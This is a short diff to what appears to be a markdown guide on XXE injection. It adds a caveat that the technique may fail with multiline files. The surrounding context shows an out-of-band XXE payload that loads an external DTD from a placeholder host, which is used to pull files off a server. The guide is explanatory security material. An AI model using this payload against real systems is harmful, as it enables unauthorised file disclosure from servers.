@@ -73,6 +73,8 @@
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-DTD-URL/example.dtd"> %xxe;]>
 ```
 
+Note: This technique might not work with multiline files.
+
 ## Finding hidden attack surface for XXE injection
 
 **First case** - Requests that contain data in XML format
